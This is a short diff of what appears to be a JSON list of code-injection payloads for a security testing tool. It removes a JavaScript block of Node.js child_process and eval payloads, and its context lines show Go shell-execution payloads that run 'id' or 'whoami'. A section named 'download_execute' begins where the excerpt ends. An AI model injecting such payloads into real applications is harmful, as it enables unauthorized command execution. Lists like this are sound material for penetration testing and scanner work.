@@ -229,13 +229,7 @@
                     "cmd := exec.Command(\"sh\",\"-c\",\"id\"); out, _ := cmd.CombinedOutput(); string(out)",
                     "exec.Command(\"powershell\",\"-Command\",\"whoami\").Output()"
                 ]
-            },
-            "javascript": [
-                "require('child_process').exec('whoami')",
-                "eval(\"require('child_process').exec('whoami')\")",
-                "process.mainModule.require('child_process').execSync('whoami').toString()",
-                "global.process.mainModule.require('child_process').exec('id')"
-            ]
+            }
         },
         "download_execute": {
             "unix": [
